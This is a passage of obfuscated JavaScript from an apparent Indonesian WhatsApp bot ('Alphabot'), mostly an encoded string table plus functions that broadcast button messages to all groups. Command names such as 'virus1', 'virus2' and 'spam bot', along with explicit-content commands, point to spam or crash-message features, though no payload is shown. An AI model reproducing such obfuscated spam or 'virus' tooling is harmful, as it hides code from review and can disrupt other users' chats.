app.net','goose','results','Tiktok\x20Wit','HeHsU','arah\x20yang\x20','idak\x20minum','lah\x20suami\x20','t\x20dipastik','au\x20mau,\x20di','ile/9fc9b3','t\x20hati\x20saa','yOKUO','match','nosGU','i\x20pertama.','gan\x20adalah','dan\x20memuka','lah\x20menjad','lam\x20usahan','k\x20dikerjak','aya\x20tidak\x20','i\x20size\x20thu','a\x20bagi\x20wan','call\x20whats','termotivas','sfw/','dang\x20dikir','ING\x20GROUP`','_\x0a\x0aCaranya','61d42f7cac','ku\x20masih\x20s','HUTFL','ejadian\x20ya','ra\x20gara\x20si','di\x20bijak\x20s','isForwarde','processing','Berikut\x20li','9YP2ZQn4','「\x20*PUBLIC-','ayu','\x20kamu\x20belu','kan\x20beraki','vQQfj','Mei','kira\x20udah,','https://ww','teguh,\x20Tuh','Kalau\x20kamu','daripada\x20h','i.\x20Makanya','“Cintailah','register\x20o','get','use\x20the\x20se','tahu,\x20Sema','tsar','au\x20tiktok\x20','bisa\x20membu','6288743504','profilePic','nya\x20orang-','en68','\x20lalu.\x20Tap','Emoji-Goog','gacha\x20coga','bHkkU','ukhty','ang\x20bisa\x20m','a\x22\x20selama\x20','WM.mp4','hmu.','flgXD','false%7D%2','undefined','ahun\x20ini?','externalAd','\x20ini\x20adala','viona','Usage:\x20','video','contentTex','contextInf','OVO','aJtYz','command_','gkan,\x20apal','SzUvw','mentionedJ','AUDIO','@s.whatsap','\x20akan\x20liha','no\x20wm\x20ting','more\x20quote','buttonsRes','an\x0a5.\x20Sele','an,\x20dan\x20im','💦\x20Title\x20:\x20','akan\x20hancu','XMLHttpReq','asukan\x20kul','.\x20Namun,\x20j','Apakah\x20tak','makermenu','ttp4','feed','delvira','“Semakin\x20b','\x0a🌀\x20Url\x20:\x20','ama,\x20bersi','semoji','rd\x20@','%22pins%22','poke','ngif','an\x20the\x20lim','ile/6de20d','1da2234005','HDeNF','em\x20Pakai\x20G','dXIBr','video\x20','erorLink','upport\x20but','ses\x20maka\x20l','\x20inginkan,','an\x20bodohny','sendMessag','%2Fsearch%','solo','\x20dapatkan\x20','bPlES','cCsdz','ripada\x20ber','38378','\x20Anda\x20iala','.presentat','ton\x20silahk','u\x20bilang\x20b','\x20(Siap\x20Ant','\x20orang\x20lai','“Berakit-r','alan\x20adala','rYAYVeWq-7','fnRqL','t\x20media\x20ak','\x20Second*','gi\x20^_^','✨\x20*Followi','Sebenarnya','v9gIBMu9tX','api\x20apa\x20da','tidurlah\x20s','\x20aku,\x20itu\x20','gue\x20anak\x20l','Terbuka\x20un','ng\x20dan\x20mer','toString','remoteJid','ta\x20menjadi','vo13','ataannya.','api\x20perasa','4i1.jpg','Lbqbs','quotedM','📍\x20Nama\x20:\x20@','bot_','sia\x20yang\x20s','X/A=','ukan\x20untuk','o=decrease','.com/api/t','an\x20kalau\x20y','\x20:*\x20720kbp','ja).”','\x20pgn\x20balik','oNTav','6199803015','adalah\x20kub','sai\x0a\x0a_Rega','supan/v2/','\x0a•\x20HADS\x0a•\x20','angemymind','n\x20bilang\x20\x22','copyNForwa','n/vnd.open','2878052ptZIfi','\x20sange','Saya\x20tidak','vIiSb','tiktokwm','manga','dxrNF','applicatio','*Title*\x20:\x20','4W5fYrjbea','Cinta\x20buka','tuk\x20Anda,\x20','l\x20seseoran','Upgrade\x20Pr','ticker','ilih\x20Pay\x20/','865992KimVdS','remium\x20saj','productIma','gecg','forwarding','Video\x20(360','Zfnms','huangzitao','apalagi\x20wa','\x0a🐨\x20Ext\x20:\x20M','bat\x20buruk\x20','tion','join\x20the\x20g','\x20tidak\x20bis','enu','🐶\x20Menu\x20ke-','erbot\x20◠‿◕','isa\x20makan\x20','d?name=','zNpYK','rat.\x20Kau\x20t','\x20Title\x20:\x20','asupan','ang\x20daripa','PR-ku\x20adal','\x20OVO\x20via\x20H','RWkBF','ji\x20silahka','jhope','ang\x20tertun','7326@s.wha','di\x20wa/tele','an\x20(ganjar','YZoEB','✴️\x20Menu\x20ke-','ge\x20photoox','cintai,\x20be','ephemeralM','spam\x20bot\x20💞','sudah\x20tert','data','opay18','langsung_g','g\x20dapat\x20me','ama\x20kamu\x20j','instagrams',',\x20maka\x20tem','IXRuM','🦁\x20*Ext*\x20:\x20','arta\x20benda','pa\x20kita\x20si','Sabtu','kYt]*','membenci\x20d','tungkan\x20da','k\x20yang\x20kit','Alphabot\x20s','aik\x20untuk\x20','Tuhan\x20memb','bayar_ovo1','caption,\x20a','CwWwF','🐹\x20Menu\x20ke-','n\x20menu','ilangan\x20se','document','nenek\x20moya','yuBMy','doge','Cara\x20palin','pi/v2/img/','nerJid','🦊\x20Menu\x20ke-','apat\x20kentu','QVmmd','NOWM','mbnail','funmenu','```Jadikan','le.js','Oktober','miskin\x20tid','ak\x20ingin\x20t','mburu\x20Mile','WpVlm','ah\x20satu\x20an','ECT','audio/mp4','xJwIbhBJYz','ownermenu','uhkan\x20agar','t\x20support','G\x20GROUP```','https://ha','*MEDIAFIRE','downloadme','BJEDe','a\x20sama\x20sia','businessOw','classic','g,\x20maka\x20se','22options%','WKxlm','9970ZyMaIb','emoji','.com/api/c','\x0a🐣\x20Upload\x20','https://ap','fd073.jpg','eron','lah\x20stimul','upmenu','yat','serializeM','ung-renung','ia\x20OVO,\x20DA','ya.\x20Andai\x20','nangkan\x20😇,','tt\x20anjimmm','\x20kalo\x20udah','gar\x20hidup\x20','libwebp','📊\x20*Quality','rdianto-ch','priceAmoun','n\x20membasah','ya,\x20maka\x20g','empurna,\x20j','T*\x0a\x0a','verifikasi','Jika\x20kamu\x20','dare','kaki\x20lima\x20','g\x20yang\x20per','perasaan\x20c','ng\x20tertund','BjZx9tvY','urce/BaseS','mu\x20telah\x20m','net/v2/?lc','\x20Anda,\x20tet','mu\x20beleum\x20','a\x20apa\x20nih?','/p_2032z7a','kan\x20di\x20pil','y7_MoRYlA','chats','on\x20below','relayWAMes','a\x20inginkan','Message','tu\x20dicipta','Desember','sudah\x20repo','MXVkg','membuat\x20se','ki\x20yang\x20bi','ketik\x20','min\x27(320,i','\x20to','ardianto','n\x20botnya\x20','“Carilah\x20i','nermenu\x20co','Belas\x20kasi','idup\x20adala','pembayaran','orang.','Score','sic.mp3','ungi\x20tanpa','\x20disajikan','a\x20dengan\x20k','tpwXOQusBR','beberapa\x20k','\x20dia\x20\x22i\x20lu','nda.”\x20–\x20P.','ap\x20basah.”','ied\x20does\x20n','ggota\x20grup','CnqZc','h,\x20dan\x20seb','BY\x20ZEEONE\x20','goprem','ad=320:320','ODE','Sahabat\x20ya','snap/post\x20','ekarang\x20de','“Berlatih\x20','*🔗\x20Link\x20:*','mu,\x20dan\x20ma','Kirim\x20peri','984f9.jpg','[a][b];\x20[a','\x20diri\x20send','Choose\x20vid','ssage','following','88e11.jpg','aUT5WmYV','ang\x20yang\x20b','*PLAY\x20MUSI','iar\x20Tuhan\x20','&color=blu','kan\x20Nomina','pinterest2','t.com/reso','HH:mm:ss','uan\x20dan\x20me','Mediafire\x20','aja\x20membia','itu\x20tidak\x20','ya\x20milik\x20t','~\x20@','inya,\x20menj','set\x20sticke','ile/924310','seperti\x20se','n\x20Nominal\x20','MAGE\x20','ream','ikit\x20yang\x20','\x20tidak\x20per','JASA\x20SEWA\x20','spect_rati','benedict','\x20kb\x0a🍃\x20View','cors','🐰\x20*Filesiz','Kirim\x20pesa','9a236a4','n\x20botnya','ca37c.jpg','HRciA','fileName','instareels','r\x20oleh\x20ser','/p_2068ity','fFwTz','hagia\x20dan\x20','ir\x20🤔','groupJid','\x20Alesanya?','MP3','neofetch\x20-','DANA\x20via\x20H','Next\x20\x20for\x20','\x20yaitu\x20pas','ketik\x20pake','amu','ebih\x20besar','locationMe','Ex\x20:','wbApjkyODb','\x20a\x20link_','Jadi\x20jika\x20','toFixed','n,\x20kalau\x20k','getik\x20di\x20g','s\x20💞','sakura','FxuHg','Button\x20mes','\x20Fisika.\x20L','getSeconds','dndow','ah\x20merindu','g..??”','VXOgp','at\x20anda\x20te','3371547STEqXH','\x20\x22\x20di\x20depa','url','channel/UC','\x20mereka\x20pa','e\x20you\x20repl','tidak\x20munc','tyni','t.”','\x20cinta\x20sam','Video\x20(108','dfzAV','nakiri_ali','\x20dan\x20masa\x20','ge\x20animeme','h\x20atau\x20kal','aha\x20adalah','\x20saya\x20diam','bcigH','kirim\x20foto','getDay','pat-gandak','ot\x20contain','utf-8','siapa\x20oran','Started\x20:\x20','buttonsMes','nUTJu','Jika\x20whats','en?type=ch','ge\x20image\x20e','balik\x20kepa','indukan\x20ka','i\x20oleh\x20kei','shinka','api\x20orang\x20','xfXHy','\x204!*','ang\x20tersed','ytmp4aja','Bilang\x20\x22KA','&impostor=','aja\x20dibawa','woof','delete','yzPuM','elihat\x20ke\x20','75616e6ac9','e\x20kata\x20kas','SUB\x20ZEEONE','kembali,\x20a','ta\x20tidur.\x20','.com/api/a','September','\x20dilempar\x20','an\x20kebodoh','.\x20Untuk\x20me','santuy','toFormat','“Tidak\x20ada','ttp2','dang\x20berpu','a\x20Aplikasi','JMphX',',\x20tetapi\x20t','ZEEONE\x20OFC','downloadAn','erlebih\x20da','ytmp3aja','animemenu','replace','\x20yang\x20bera','use\x20the\x20ow','tiktok','a\x20apa-apa.','\x20diam?','nmenu\x20comm','h\x20list\x20emo','\x20untuk\x20men','6283136505','cker\x20Video','GOPAY','for\x20new\x20st','know\x20anyon','pasrahkan\x20','8529655657','Kesabaran\x20','pwankg','ia\x20yaitu\x20v','Kamis','tu\x20hubunga','aan.','_Tunggu\x20be','Testing\x20sp','3|0|4|2|1','XPmFj','s.whatsapp','ur\x20hanya\x20d','ytmp4doc','a,\x20maka\x20An','ntaimu.','ika\x20Anda\x20i','5000000000','ika\x20masala','mediafire','Emoji-Micr','Speed:\x20','t\x20stc\x20cmd\x20','at\x20orang\x20l','currencyCo','an\x20tidak\x20m','ICKER\x20TO\x20I','2d0c2195ab','idupan\x20kit','use\x20the\x20ns','a\x201\x20hari','\x20yakin\x20nih','ngungkanla','\x20ke\x20depan.','virus2','TpzVt','pa\x20saat\x20la','ana18','use\x20the\x20fu','t,\x20seberat','title','kr_robot','images','[\x1b[1;32m\x20C','berlatih?”','/\x20Bayar\x0a3.','endsWith','\x20:\x20_@','input','anmu.”','nkpZF','lucu','essage','donasi_kak','MgFEl','ya_kak','p.com/EU89','gDkso','\x20duration\x20','_\x0a\x0a','Kalau\x20menc','Hay\x20@','8s1.jpg','\x20Gopay','noteks','baka','n\x20ss\x20ke\x20pe','\x20menghalan','🏅\x20Source\x20s','ented\x20in\x20t','ua\x20pria\x20me','tau\x20bokap?','ng\x20bikin\x20k','bRVDP','“Saat\x20kamu','lFmcw','⋮☰\x20BACK','gasm','admin','s\x20duluan\x20s','minjamkan\x20','Gagal,\x20pad','-PLAY\x20MP3*','D3MAaYx15D','MmrgU','pa\x20aja?\x20be','.be/w4iQ4r','alan\x20untuk','low&apikey','IZlFB','\x20untuk\x20dir','_\x0a•>\x20Nomor','/p_2032mwb','scribe\x20htt','ai\x20admin\x20t','isBkf','a\x20lebih\x20ke','byNue','fline','eorang\x20pri','lin\x20aku,\x20a','\x20™©\x20|\x20By\x20','convertmen','catch','1614069378','EbzPu','bx/mFEB8SW','i.telnyx.c','ovoOE','\x20bukan\x20tin','suka\x20mabar','mpurna\x20aka','nisa','salahan','pai\x20tua.”','PmVgR','uk\x20memilik','red','dikuburkan','asa','tpE=','filename','Command','random','telegram\x20s','\x20sukses\x20it','ntah\x20*','\x20tepian…be','uka\x20sama\x20k','\x20ninggalin','bayar_gopa','adsheetml.','*📽️\x20YOUTUBE','g,\x20kuning\x20','ge\x20otherme','onlygc','error','SALEHA\x20(Su','group\x20clos','tuk\x20link_','xdfyj','h.\x20Jangan\x20','ication','\x20&\x20leave','glasses','*Ext*\x20:\x20MP','dak\x20untuk\x20','p.com/E8NE','sasuke','\x0a\x0a_Powered','capqN','%22%2C%22s','\x20kita\x20kerj','id:\x2018)\x0a\x0a•','om/','&color=yel','jpegThumbn','japan','rgi.','terakhir\x20b','Jum\x20at','dio/araara','a\x20Masterca','ile/851e79','Ram:','a\x20yang\x20And','headerType','OUP\x20CLOSE\x20','f\x20[p];\x20[b]','playmp4','push','ekarang\x20ju','.com/api','da\x20diri\x20se','join','a,\x20agar\x20te','mcVkf','shana','avatar','h\x20apa\x20yang','caya\x20diri.','emium','i\x20yang\x20ter','ebih\x20baik\x20','Ramein\x20kak','an\x20turun\x20k','kXrt+8eqBg','All\x20menu\x20b','m\x20ke\x20salah','nmu','enis\x20yang\x20','Emoji-Sams','OFC','tipan\x20itu','pb1.jpg','3595319159','ic.mp3','ar,\x20hingga','\x20:\x0a1.\x20Buka','getDate','atsapp\x20bot','g\x20nyokap\x20a','JBFMR','ttmp4','&crewmate=','68abaa14f7','o\x20?','&color=red','ile/d44d0c','Qs.\x20Al\x20Had','CnPvF','_\x0a•\x20Nomor\x20','menu\x20comma','bdsm','PAYMENT\x20OV','i\x20Anda\x20han','\x20miskin,\x20t','record\x20voi','keta','DOCUMENT','OJixe','STC\x20CMD\x20IM','s:\x20','adalah\x20ban','🐭\x20*Size*\x20:','338BA8186C','\x20mantan\x20da','erah\x2024\x20ja','kimjondae','a4639.jpg','reads','Audio\x20(128','Tiktok\x20WM.','\x20Nominal\x20p','result','“Wanita\x20ya','mikosiba','\x20akan\x20menj','oruptor\x20di','a\x20tersebut','rsakit-sak','lWTdo','rsebut','\x20tapi\x20tida','💌\x20*Followe','kobot.xyz/','kotori_min','?\x20rasanya\x20','PAYMENT','/p_2068gt4','uran\x20diman','\x20saja\x20tema','https://h.','ika.\x20Lebih','\x20butuh\x20beb','quran-api-','emilia','then','username','Sebuah\x20neg','(320,iw)\x27:','kir\x20jalan\x20','uery','🙍‍♂️\x20Owner','a\x20membuatm','jelek.”','2bwmxqu','ODby7_MoRY','orang.\x20Say','ipe\x20pacar\x20','Youtube\x20Mp','LxHjV','\x20ada\x20darah','an\x20datang\x20','ang\x20bohong','amu,\x20terus','g\x20sukses\x20a','rkanmu\x20mel','kVDqZ','Membaca\x20se','ge\x20storage','\x20bayar\x20pak','sheet','akan\x20membe','85459.jpg','empty','sa\x20ringan\x20','.php?url=','i\x20memegang','dak\x20makan\x20','ku\x20saja.','“Pakaian\x20i','chat\x20ke\x20ko','dul\x20video\x20','anna',',\x20kamu\x20mau','fILWH','k,\x20niscaya','Mohon\x20maaf','“Menahan\x20g','\x20database.','dikit\x20perk','k\x20bicara\x20d','100000','idur.”\x20–\x20P','sUXlM','🐨\x20Menu\x20ke-',',\x20supaya\x20s','a\x2024\x20jam','pekerjaan\x20','anya\x20dua','\x20\x0a🎃\x20Size\x20:','1537152xpNNFY','bisa\x20kita\x20','kan\x20apapun','mencintai.','8ball','amu\x20sakit\x20','\x20this\x20scri','Penderitaa','las,\x20yang\x20','it\x20dahulu,','rkreasi\x20da','SRhCY','fnGTW','-stdout','Link\x20tidak','\x203\x20hari','kos.life/a','https://d.','ofc','🎦\x20*Y\x20T\x20\x20P\x20','cjKgg','infobot','bahtera\x20hi','api\x20memban','tuk\x20orang-','Emoji-What','akit\x20dahul','fake','WO\x20\x22\x20selam','%2C%22no_f','a\x20istri\x20sa','t\x20yang\x20kua','tidak\x20ada\x20','ada\x20yang\x20m','batu\x20oleh\x20','dalah...\x20T','\x20|\x20','foto\x20pacar','ytmp4ajahd','さ\x20Group\x20wh','ta…tapi\x20sa','top4top.io','an\x20dikirim','method','virus1','ng\x20dihabis','u\x20mungkin\x20','audio/mp3','k|blue|bro','ge\x20telegra','g\x20yang\x20bis','ena\x20aku\x20sa','Hmm,\x20banne','a.”','Sudah\x20dapa','dzWwbApjky','i\x20sesuatu\x20','18241b0142','IwuwLlFELw','kimtaehyun','1|2|4|0|3','aran.”','\x20kehancura','etangga.”','-PLAY\x20MP4*','2202dOfJCB','1625333333','elin\x20ಠ︵ಠ','a\x20atau\x20tah','intaimu\x20ad','utu.be/ERG','\x20ilusi\x20yan','orbanan\x20mu','orang\x20nges','ok\x20buat\x20ku','vietnam','dohkyungso','\x20:\x20','gangbang','pe\x20pasanga','\x20donasi\x20vi','nnagen&tex','kjmOv','ku\x20tidak\x20b',',\x20aku\x20tak\x20','11381886AGAOrF','uk\x20kehidup','&data=%7B%','XqfAD','ntukan\x20tem','ah\x20pinjama','.0,\x20split\x20','a\x20sama\x20ora','583240QFyMXJ','\x20yang\x20kita','🐭\x20*Ext\x20:*\x20','g.us','e\x20:*\x20','i\x20audio\x20at','ge\x20group\x20c','awoawo','suga','eNWeT','\x20dalam\x20sua','sApp','Botwea\x20©2k','tan\x20terbes','kucing','yeZNR','im\x20mungkin','OT*\x20by\x20me','map','erapa\x20meni','terburuk\x20l','k\x20ada\x20manu','chacecan\x20c','\x20mantan\x20pa','gi\x20setiap\x20','Masukkan\x20q','lebih\x20baik','h%22%3Afal','jomblo','buk\x20belaja','_transpare','1;37m>','“Dalam\x20pan','CjAYa','wallpaper','stickerMes','ext=','LuPXg','g\x20melelahk','naruto','Sekarang\x20a','Khhxt','\x20sekarang,','FyslV','getHours','mu\x20jadikan','cky\x20to\x20hv\x20','hadap\x20sesa','a\x20menyenan','Eror','ter-','pp.com/api','utube.com/','ehat,\x20terd','seMessage','only','ang\x20kita\x20l','t\x20di\x20dunia','njimm\x20gabu','\x20hidup\x20leb','ganti\x20nama','geCount','dari\x20batas','jXsWB','bukanlah\x20j','k\x20ngiler\x20d','YzfQu','i\x20lima\x20itu','PUBLIC\x20-\x20M','ROJPC','sewa_1p','mp4','\x20,\x20atau\x20GO','\x20mencapai\x20','yang\x20memba','\x20tetapi\x20ti','holoyero','rkgreen|li','nstagram.c','Sc\x20*SELF-B','h\x20baik\x20lak','ita\x20adalah','BdNXT','reGdE','ptions','\x20user\x20priv','a\x20ikut\x20ter','foot','ile/6941a5','an\x20tetap\x20s','sah\x20payah\x20','vZlJw','du,\x20ini\x20be','Hal\x20terbai','/p_20681as','tu\x20dia\x20unt','emojinya?','ka\x20aku\x20sak','it,\x20lalu\x20s','i,\x20mendidi','an\x20tonton\x20','2isPrefetc','WCVtt','9199191919','\x20command_','Agjsd','HEVHh','magenta','xlVhx','tweettrump','\x20negara\x20te','isa\x20mencon','n\x20yang\x20tid','Pernah\x20suk','save','wnloadmenu','ngChange','igfoto','ytmp3\x20[lin','OUP\x20OPEN\x20','femdom','Yah\x20gagal,','mXjVZ','\x20valid\x20ata','a\x20tidur\x20ka','wuXaO','feetg',',\x20berkobar','mediaType','\x20akan\x20hanc','ngin\x20mengu','\x20seseorang','hope_boy','0kbps)','3337@g.us','l-hal\x20keci','extendedTe','ument.pres','e..._','SlyvM','ya.','.\x20Sebab\x20ji','othermenu','\x20tag\x20membe','euse','jaminan\x20ke','alcakenya','aca\x2030\x20men','cha\x20cogan\x20','AVLLZ','riyas_grem','eneran\x20😎\x20','akan\x20berul','-15','Ilmu\x20penge','ge\x20group\x20o','f\x20atau\x20tek','a\x20sekampun','\x20nila\x20seti','g\x20baik\x20unt','jAhmG','EL\x0a•\x20SATRI','this\x20if\x20yo','lmenu\x20comm','cqjyP','eninggal\x20s','luhan','hak\x20kamu,\x20','sebutkan\x20t','mangayutri','mmand_','Big\x20Thanks','nd_','mama_gina','na\x20berhubu','c.us','satu\x20saja\x20','del','Emoji-Open','NkBAVg8GMe','tt1','gold','yang\x20dibut','inan\x20untuk','STC\x20CMD\x20PL','\x20yang\x20tert','couple','ndekati\x20ti','image\x20effe','sourceUrl','rku\x20gak?\x22\x20','SELECT\x20HER','\x20by\x20@','cuckold','ngan\x20erat\x20','nget','XXthk','rnah\x20kamu\x20','akan\x20dan\x20t','bagimu.','999.webp','ebih\x20keras','\x0a\x0a_Regard\x20','🆔\x20*ID\x20:*\x20','MODE*\x20」','danya.\x20Bal','Watermark','resource_r','adi\x20buat\x20a','\x20yang\x20cerd','alasannya\x20','lENVK','nmu\x20yang\x20a','udian.”','kelihatan\x20','use\x20the\x20qu','bG0=','ixels-','en=reserve','⋮☰\x20MENU','pat','ku\x20gak\x20bis','hanya\x20seka','ntent','pian\x20hadir','\x20yang\x20udah','\x20*DELIVERE','ngan\x20yang\x20','.net/d/f/A','an\x20lagu/qu','\x20pergi\x20jau','h\x20menjadi\x20','ta\x20lupa,\x20s','666.webp','quoted','xt_on_reso','VeCAk','ak\x20orang?\x20','p.com/GY74','di\x20bawah.','UYHcw','\x20tidak\x20tul','fileSha256','Rabu','*🎧\x20P\x20L\x20A\x20Y','2Fpins%2F%','i\x20tertangk','jungkook','Salah\x20satu','DOJmh','cQkEQ','indonesia','etch_conte','t\x20siapa\x20se','n\x20berkeing','sh/pacar\x20s','emas,\x20emas','ke\x20Beha)\x20a','g\x20terbaik\x20','fPcTp','berhasilan','sage\x20Payme','Lu\x20siapa\x20j','play\x20query','kimminseok','da…kebohon','g\x20keras\x20ke','“Sesungguh','stringify','qr_gopay13','banyak.”\x20(','ayuzawa','Emror','dUIOB','keinginan\x20','\x20takut\x20men','neko','epadanya..','ngat\x20benci','solog','=0.9','ng\x20kaya','ttdownload','messageSen','bocil','kbps)','\x20akan\x20dili','e91d325a70','rd\x20dan\x20Vis','kimjong','holo','Tak\x20semua\x20','\x20nah\x20sekar','ile/435878','ge\x20convert','dagang\x20kak','\x20fitur\x20ini','lewdk','hala\x20yang\x20','e\x20sini','masih\x20di\x20i','🦡\x20*Link\x20:*','u\x20want\x20to\x20','QR\x20CODE','jiso','erok','ar\x20bunga\x20k','Video\x20(720','sama\x20bersa','ge\x20gacha\x20c','u\x20bukan\x20ti','ngan\x20sampa','api-create','mio_akiyam','age','ada\x20selalu','at\x20(serah\x20','Nopember','ile/96b7da','h\x20banyak\x20u','a\x20atau\x20pak','Lelaki\x20yan','utan\x20sesua','i\x20kekayaan','ration','tangan?\x20ka','\x20normal\x20di'];_0x43e5=function(){return _0x37ba6d;};return _0x43e5();}const ini_bc_gc_bang=_0xfe7553=>{const _0x349515={};_0x349515[_0x7e1b97(0xac5,0x72f,0x703,0x4bf)]='🐨\x20Owner';function _0x7e1b97(_0x18d05c,_0x26de17,_0x3c290d,_0x10681d){return _0x4aaba1(_0x26de17-0xcd,_0x3c290d,_0x3c290d-0x1b4,_0x10681d-0x1a);}_0x349515[_0x5a73c1(0xd2d,0x897,0x67d,0xa7b)]='sewa_kak',_0x349515[_0x7e1b97(0xbd3,0xd43,0x93d,0xcc8)]='🔖\x20List\x20Sew'+'a',_0x349515['NLiwN']=_0x7e1b97(0x912,0xcd2,0xeb1,0xda7)+'21',_0x349515[_0x5a73c1(0x8cd,0x66f,0x41a,0x478)]=function(_0x352143,_0xa2b577){return _0x352143===_0xa2b577;};function _0x5a73c1(_0xe0d1ae,_0x39eb96,_0x16dd1b,_0x353328){return _0x406083(_0x39eb96-0x252,_0x39eb96-0x147,_0x16dd1b-0x1e,_0x353328);}_0x349515[_0x7e1b97(0x10f1,0xbfb,0xc93,0xda1)]='lYWwj',_0x349515[_0x7e1b97(0xa39,0x7a6,0xb30,0x971)]=_0x7e1b97(0x6dc,0x802,0x32c,0xd15);const _0x4c5ecc=_0x349515;var _0x3b19d7=alpha[_0x5a73c1(0x9a5,0xbaf,0xdc5,0xf56)][_0x7e1b97(0x7ed,0x7ce,0x62b,0x6cd)]()[_0x5a73c1(0x66f,0x91d,0xa24,0x9a5)](_0x4f2d35=>_0x4f2d35[_0x7e1b97(0x6a3,0x8b2,0x97e,0x5b4)][_0x7e1b97(0x103a,0xb5f,0x1002,0xb76)](_0x7e1b97(0xe7a,0xcc9,0x11dc,0x1148)));let _0x4de225=_0xfe7553;for(let _0x49c559 of _0x3b19d7){if(_0x4c5ecc[_0x7e1b97(0x239,0x51f,0x4cd,0x884)](_0x7e1b97(0x9c9,0x85c,0x6e8,0xb22),_0x4c5ecc[_0x7e1b97(0xfed,0xbfb,0xdd5,0xf2f)])){const _0x390796={};_0x390796[_0x7e1b97(0x503,0x610,0x51e,0x8b0)+'t']=_0x4c5ecc['kEqrS'];const _0x2be9ef={};_0x2be9ef[_0x7e1b97(0xac8,0x85a,0x431,0x3d7)]='ownerku',_0x2be9ef['buttonText']=_0x390796,_0x2be9ef[_0x5a73c1(0xa29,0xa33,0xd94,0xb91)]=0x1;const _0x4bf149={};_0x4bf149[_0x7e1b97(0xc61,0x85a,0xabc,0x6fb)]=_0x4c5ecc['gdhqN'],_0x4bf149[_0x5a73c1(0xdb7,0x906,0x7d2,0x714)]={},_0x4bf149[_0x7e1b97(0x548,0x8e3,0xb50,0x8c6)]=0x1,_0x4bf149[_0x5a73c1(0xdb7,0x906,0x7d2,0x714)][_0x7e1b97(0xa53,0x610,0x48b,0x797)+'t']=_0x4c5ecc[_0x5a73c1(0xcbe,0xe93,0xb71,0xcaf)];var _0x2e8ef3=[_0x2be9ef,_0x4bf149];const _0x3175be={};_0x3175be[_0x7e1b97(0x8ab,0x953,0xd89,0x6e8)+'t']=_0x7e1b97(0x630,0x896,0xb7b,0xc7f)+'*'+_0x207d4f+_0x329ffc+_0x155de4,_0x3175be[_0x7e1b97(0x668,0x6b3,0x2a4,0xb8c)]=''+_0x56c64f+_0x3a5342+_0x526311+_0x477cd2+_0x5b42da+'©\x20'+_0x445062,_0x3175be[_0x7e1b97(0x9ae,0x89e,0x92b,0x5e6)]=_0x2e8ef3,_0x3175be['headerType']=0x1;var _0x5e4d20=_0x3175be;const _0x4d49f4={};_0x4d49f4[_0x7e1b97(0xa06,0x600,0xac2,0x1f2)]='hi',_0x4d49f4[_0x7e1b97(0xcfb,0x9d1,0x90f,0xbad)+_0x7e1b97(0xc07,0xa75,0xc9c,0x6a8)]=0x3b9aca00,_0x4d49f4[_0x7e1b97(0x9af,0x925,0x4d7,0x4a2)+'d']=!![],_0x4d49f4[_0x5a73c1(0xb15,0x68e,0x9f0,0x8ec)+_0x5a73c1(0x5fc,0x65e,0x769,0x418)]=!![];const _0x302bfa={};_0x302bfa[_0x5a73c1(0x73b,0x6ca,0x68c,0x448)]=_0x4c5ecc['NLiwN'],_0x302bfa[_0x5a73c1(0xa8e,0xaa4,0xbee,0xc04)+'o']=_0x4d49f4,_0x302bfa[_0x7e1b97(0x1208,0xdb0,0x1110,0xfa2)]=_0x4599c8,_0x302bfa[_0x7e1b97(0x1af,0x53e,0x588,0x9d7)+_0x7e1b97(0xe6,0x50e,0x530,0x9bd)]=!![],_0x37b881[_0x7e1b97(0xbfe,0x981,0xe9f,0xac7)+'e'](_0x10f62e[_0x5a73c1(0x603,0xa02,0xd8f,0x743)],_0x5e4d20,_0x11c21e[_0x7e1b97(0xcc3,0xaf6,0x719,0x647)+_0x5a73c1(0xc19,0x71c,0x6e4,0x4af)],_0x302bfa);}else{const _0x3409fc={};_0x3409fc[_0x7e1b97(0x420,0x610,0xa93,0x4e6)+'t']='🐨\x20Owner';const _0x3bf9ac={};_0x3bf9ac[_0x7e1b97(0x769,0x85a,0x552,0xd31)]=_0x4c5ecc[_0x5a73c1(0xdc0,0x8f6,0xad6,0x731)],_0x3bf9ac['buttonText']=_0x3409fc,_0x3bf9ac[_0x7e1b97(0xa00,0x8e3,0x439,0x894)]=0x1;const _0x430c24={};_0x430c24[_0x5a73c1(0x59f,0x760,0x7c6,0xa9d)+'t']=_0x7e1b97(0x164,0x4ad,0xb1,0x896)+'a';const _0x2a8465={};_0x2a8465[_0x7e1b97(0x378,0x85a,0xa70,0xb5b)]=_0x4c5ecc['gdhqN'],_0x2a8465[_0x7e1b97(0x36b,0x7b6,0x33b,0x527)]=_0x430c24,_0x2a8465[_0x7e1b97(0x6ed,0x8e3,0x875,0x6a9)]=0x1;var _0x411d5d=[_0x3bf9ac,_0x2a8465];const _0x4915f4={};_0x4915f4[_0x5a73c1(0x89b,0xaa3,0x81e,0x8b6)+'t']='*BROADCAST'+'*'+enter+enter+_0x4de225,_0x4915f4[_0x7e1b97(0xa53,0x6b3,0x349,0xb05)]=''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator,_0x4915f4[_0x5a73c1(0xc6c,0x9ee,0x6c8,0xcf6)]=_0x411d5d,_0x4915f4[_0x5a73c1(0xe16,0xd27,0x820,0x11d3)]=0x1;var _0x1e513e=_0x4915f4;const _0x3ac646={};_0x3ac646[_0x5a73c1(0x3b5,0x750,0x5f5,0xa8d)]='hi',_0x3ac646['forwarding'+_0x5a73c1(0xe0a,0xbc5,0x715,0xfa4)]=0x3b9aca00,_0x3ac646['isForwarde'+'d']=!![],_0x3ac646[_0x7e1b97(0x681,0x53e,0x276,0x77b)+_0x7e1b97(0x916,0x50e,0x5d1,0x39f)]=!![];const _0x3bc631={};_0x3bc631[_0x5a73c1(0xa9e,0x6ca,0x1de,0x476)]=_0x4c5ecc['NLiwN'],_0x3bc631[_0x5a73c1(0xa3e,0xaa4,0x80e,0x695)+'o']=_0x3ac646,_0x3bc631[_0x7e1b97(0xac2,0xdb0,0xcc3,0xa07)]=ftroli,_0x3bc631[_0x7e1b97(0x302,0x53e,0x95e,0x4e7)+_0x5a73c1(0x243,0x65e,0x8eb,0x16c)]=!![],alpha[_0x5a73c1(0x6a3,0xad1,0xd5a,0xc5c)+'e'](_0x49c559[_0x7e1b97(0x80c,0x8b2,0xaf9,0xd5c)],_0x1e513e,MessageType[_0x5a73c1(0xdfc,0xc46,0xe68,0xef3)+'sage'],_0x3bc631);}}},ini_bc_pc_bang=_0x100c42=>{const _0x12d054={};_0x12d054[_0x545c88(0x85a,0x418,0x643,0x635)]='ownerku';function _0x4b16fe(_0x496483,_0x1b8195,_0x1d40c1,_0x20386e){return _0x406083(_0x1b8195- 